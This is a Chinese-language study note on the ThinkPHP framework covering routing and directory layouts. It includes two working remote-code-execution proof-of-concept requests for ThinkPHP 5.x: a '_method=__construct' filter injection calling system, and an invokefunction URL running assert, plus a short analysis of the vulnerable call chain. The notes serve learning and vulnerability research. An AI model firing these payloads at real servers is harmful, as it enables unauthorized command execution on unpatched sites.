# Thinkphp

thinkphp采取MVC架构

下面是一个Controllor的示例

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function hello(){
        echo 'hello,thinkphp!';
    }
}
```

或``tp>5.0``

```php
<?php
namespace app\home\controller;

class Index 
{
    public function index()
    {
        return 'hello,thinkphp!';
    }
}
```

在一般的项目结构中，我们会把它写在

``application/home/controller/index.php``下

``Home\IndexController``类就代表了``Home``模块下的``Index``控制器，而``hello``操作就是``Home\IndexController``类的``hello``（公共）方法。

当访问 ``http://serverName/index.php/Home/Index/hello`` 后会输出：

```
hello,thinkphp!
```

对于Controller我们可以采取如下方式调用


1.  ``http://serverName/index.php/模块/控制器/操作/[参数名/参数值...]``

2. ``http://<serverName>/appName/?m=module&a=action&id=1``


## ThinkPHP 3.X

3.2.3 的默认目录结构如下

```
www  WEB部署目录（或者子目录）
├─index.php       入口文件
├─README.md       README文件
├─Application     应用目录
├─Public          资源文件目录
├─ThinkPHP 框架系统目录（可以部署在非web目录下面）
│  ├─Common       核心公共函数目录
│  ├─Conf         核心配置目录 
│  ├─Lang         核心语言包目录
│  ├─Library      框架类库目录
│  │  ├─Think     核心Think类库包目录
│  │  ├─Behavior  行为类库目录
│  │  ├─Org       Org类库包目录
│  │  ├─Vendor    第三方类库目录
│  │  ├─ ...      更多类库目录
│  ├─Mode         框架应用模式目录
│  ├─Tpl          系统模板目录
│  ├─LICENSE.txt  框架授权协议文件
│  ├─logo.png     框架LOGO文件
│  ├─README.txt   框架README文件
│  └─ThinkPHP.php 框架入口文件
```

可以看到在默认状态下wwwroot是可以访问到框架文件的，这可能会造成安全隐患

## ThinkPHP 5.0

5.0的目录结构如下

```
project  应用部署目录
├─application           应用目录（可设置）
│  ├─common             公共模块目录（可更改）
│  ├─index              模块目录(可更改)
│  │  ├─config.php      模块配置文件
│  │  ├─common.php      模块函数文件
│  │  ├─controller      控制器目录
│  │  ├─model           模型目录
│  │  ├─view            视图目录
│  │  └─ ...            更多类库目录
│  ├─command.php        命令行工具配置文件
│  ├─common.php         应用公共（函数）文件
│  ├─config.php         应用（公共）配置文件
│  ├─database.php       数据库配置文件
│  ├─tags.php           应用行为扩展定义文件
│  └─route.php          路由配置文件
├─extend                扩展类库目录（可定义）
├─public                WEB 部署目录（对外访问目录）
│  ├─static             静态资源存放目录(css,js,image)
│  ├─index.php          应用入口文件
│  ├─router.php         快速测试文件
│  └─.htaccess          用于 apache 的重写
├─runtime               应用的运行时目录（可写，可设置）
├─vendor                第三方类库目录（Composer）
├─thinkphp              框架系统目录
│  ├─lang               语言包目录
│  ├─library            框架核心类库目录
│  │  ├─think           Think 类库包目录
│  │  └─traits          系统 Traits 目录
│  ├─tpl                系统模板目录
│  ├─.htaccess          用于 apache 的重写
│  ├─.travis.yml        CI 定义文件
│  ├─base.php           基础定义文件
│  ├─composer.json      composer 定义文件
│  ├─console.php        控制台入口文件
│  ├─convention.php     惯例配置文件
│  ├─helper.php         助手函数文件（可选）
│  ├─LICENSE.txt        授权说明文件
│  ├─phpunit.xml        单元测试配置文件
│  ├─README.md          README 文件
│  └─start.php          框架引导文件
├─build.php             自动生成定义文件（参考）
├─composer.json         composer 定义文件
├─LICENSE.txt           授权说明文件
├─README.md             README 文件
├─think                 命令行入口文件
```



### ThinkPHP 5.0.0~5.0.23 RCE

## POC

```
http://127.0.0.1/thinkphp/index.php?s=captcha

POST:

_method=__construct&filter[]=system&method=get&get[]=whoami
```

在5.0-5.0.12核心版本中没有强制设置默认filter。所以不需要s=captcha也可以触发。而在5.0.13以上由于设置了默认filter。所以需要使用captcha这个路由。


### 漏洞分析

问题出在Request类的method()方法上

其中`method()`方法就是补丁修改的位置，在这个方法中，如果`method`等于`true`，则调用`$this->server()`方法：

![img](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112153449.png)

在`server()`方法中调用`$this->input`方法：

![img](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112154611.png)

接着调用了`filterValue()`方法：

![img](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112154923.png)

而`filterValue()`则调用了`call_user_func()`函数，如果两个参数均可控，则会造成命令执行：

![img](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112175411.png)

![img](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190116110438.png)

### 修复方法

### 参考资料

https://xz.aliyun.com/t/3845

http://blog.nsfocus.net/thinkphp-full-version-rce-vulnerability-analysis/?from=groupmessage

## ThinkPHP 5.1

## ThinkPHP 5.X RCE

## POC

5.0.x php版本>=5.4

```
http://127.0.0.1/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
```

### 漏洞分析

https://xz.aliyun.com/t/3570

## ThinkPHP 6.0